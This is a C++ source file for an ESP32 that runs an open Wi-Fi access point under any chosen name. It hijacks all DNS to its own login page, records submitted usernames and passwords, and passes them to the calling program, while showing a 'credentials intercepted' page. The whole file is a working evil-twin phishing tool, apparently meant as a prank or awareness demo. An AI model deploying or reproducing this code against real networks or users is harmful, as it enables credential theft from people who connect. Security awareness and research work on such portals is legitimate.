#include "captive_portal.h"

#include <DNSServer.h>
#include <WiFi.h>
#include <LittleFS.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"

static DNSServer dnsServer;
static AsyncWebServer server(80);

static String user_name;
static String p;
static bool name_received = false;
static bool p_received = false;



static const char *INDEX_FILE = "/index.html";

static void setupServer() {
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/html",
                  "<html><body>Captive portal</body></html>");
  });

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (LittleFS.exists(INDEX_FILE)) {
      request->send(LittleFS, INDEX_FILE, "text/html");
    } else {
      request->send(500, "text/plain",
                    "index.html not found. Upload the filesystem image (data/ folder).");
    }
  });

	server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
	if (request->hasParam("username", true)) {
		user_name = request->getParam("username", true)->value();
		name_received = true;
	}

	if (request->hasParam("password", true)) {
		p = request->getParam("password", true)->value();
		p_received = true;
	}

request->send(200, "text/html",
  "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
  "<style>"
  "body{background:#000;color:#0f0;font-family:'Courier New',monospace;text-align:center;padding-top:60px;margin:0;overflow:hidden;}"
  "h1{color:#f00;font-size:28px;text-shadow:0 0 10px #f00;animation:flicker 1.2s infinite;}"
  "p{font-size:16px;margin:10px 20px;}"
  ".blink{animation:blink 1s step-start infinite;}"
  "a{color:#0f0;display:inline-block;margin-top:30px;border:1px solid #0f0;padding:8px 16px;text-decoration:none;}"
  "a:hover{background:#0f0;color:#000;}"
  "@keyframes flicker{0%,19%,21%,23%,25%,54%,56%,100%{opacity:1;}20%,24%,55%{opacity:0.3;}}"
  "@keyframes blink{50%{opacity:0;}}"
  "</style></head><body>"
  "<h1>&gt;&gt; SYSTEM BREACHED &lt;&lt;</h1>"
  "<p class='blink'>[ CREDENTIALS INTERCEPTED ]</p>"
  "<p>Your data has been logged to the mainframe.<br>This was only a test. Or was it?</p>"
  "<a href='/'>&lt; return to safety &gt;</a>"
  "</body></html>");
  });

  server.serveStatic("/", LittleFS, "/");

  server.onNotFound([](AsyncWebServerRequest *request) {
    request->redirect("/");
  });
}

void captivePortalBegin(const char *ssid) {
  if (!LittleFS.begin(true)) {
    Serial.println("LittleFS mount failed");
  } else {
    Serial.printf("LittleFS used %u / %u bytes\n",
                  (unsigned)LittleFS.usedBytes(), (unsigned)LittleFS.totalBytes());
    File root = LittleFS.open("/");
    File f = root.openNextFile();
    if (!f) Serial.println("LittleFS is EMPTY (no files found)");
    while (f) {
      Serial.printf("FS file: %s (%u bytes)\n", f.name(), (unsigned)f.size());
      f = root.openNextFile();
    }
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
  Serial.print("AP IP address:");
  Serial.println(WiFi.softAPIP());


  setupServer();

  dnsServer.start(53, "*", WiFi.softAPIP());

  server.begin();

}

void captivePortalLoop() {
  dnsServer.processNextRequest();
}

bool captivePortalGetSubmission(String &name, String &pass) {
  if (name_received && p_received) {
    name = user_name;
    pass = p;
    name_received = false;
    p_received = false;
    return true;
  }
  return false;
}
